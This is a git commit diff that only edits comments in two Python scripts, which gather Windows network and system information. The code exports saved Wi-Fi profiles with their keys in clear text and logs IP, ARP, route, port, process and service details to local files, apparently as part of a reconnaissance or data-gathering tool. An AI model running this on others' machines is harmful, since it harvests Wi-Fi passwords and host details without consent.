405a5f997ea07a2c942bdefae0456315acd412a7
MrWolf0 <nassermessi33@gmail.com>
2023-09-29 22:51:30 +0300

    upload script for windows

--- windows_network_info.py
+++ windows_network_info.py
@@ -9,46 +9,46 @@ import requests
 
 
 def get_network_info(export_path: Path, network_file: Path):
-    # If the OS is Windows #
+    # If the OS is Windows 
     if os.name == 'nt':
         # Get the saved Wi-Fi network information, IP configuration, ARP table,
-        # MAC address, routing table, and active TCP/UDP ports #
+        # MAC address, routing table, and active TCP/UDP ports 
         syntax = ['Netsh', 'WLAN', 'export', 'profile',
                   f'folder={str(export_path)}',
                   'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
                   'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
 
     try:
-        # Open the network information file in write mode and log file in write mode #
+        # Open the network information file in write mode and log file in write mode 
         with network_file.open('w', encoding='utf-8') as network_io:
             try:
-                # Setup network info gathering commands  process #
+                # Setup network info gathering commands  process 
                 with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                     # Execute  process #
                     commands.communicate(timeout=60)
 
-            # If execution timeout occurred #
+            # If execution timeout occurred 
             except TimeoutExpired:
                 pass
 
             # Get the hostname #
             hostname = socket.gethostname()
-            # Get the IP address by hostname #
+            # Get the IP address by hostname 
             ip_addr = socket.gethostbyname(hostname)
 
             try:
-                # Query ipify API to retrieve public IP #
+                # Query ipify API to retrieve public IP 
                 public_ip = requests.get('https://api.ipify.org').text
 
-            # If error occurs querying public IP #
+            # If error occurs querying public IP 
             except requests.ConnectionError as conn_err:
                 public_ip = f'* Ipify connection failed: {conn_err} *'
 
-            # Log the public and private IP address #
+            # Log the public and private IP address 
             network_io.write(f'[!] Public IP Address: {public_ip}\n'
                              f'[!] Private IP Address: {ip_addr}\n')
 
-    # If error occurs during file operation #
+    # If error occurs during file operation 
     except OSError as file_err:
         print_err(f'Error occurred during file operation: {file_err}')
         logging.exception('Error occurred during file operation: %s\n', file_err)
--- windows_sys_info.py
+++ windows_sys_info.py
@@ -6,23 +6,23 @@ from subprocess import Popen, TimeoutExpired
 
 
 def get_system_info(sysinfo_file: Path):
-    # If the OS is Windows #
+    # If the OS is Windows 
     if os.name == 'nt':
         syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
     try:
-        # Setup system info gathering commands  process #
+        # Setup system info gathering commands  process 
         with sysinfo_file.open('a', encoding='utf-8') as system_info:
-            # Setup system info gathering commands  process #
+            # Setup system info gathering commands  process 
             with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                 # Execute  process #
                 get_sysinfo.communicate(timeout=30)
 
-    # If error occurs during file operation #
+    # If error occurs during file operation 
     except OSError as file_err:
         print_err(f'Error occurred during file operation: {file_err}')
         logging.exception('Error occurred during file operation: %s\n', file_err)
 
-    # If process error or timeout occurs #
+    # If process error or timeout occurs 
     except TimeoutExpired:
         pass
 
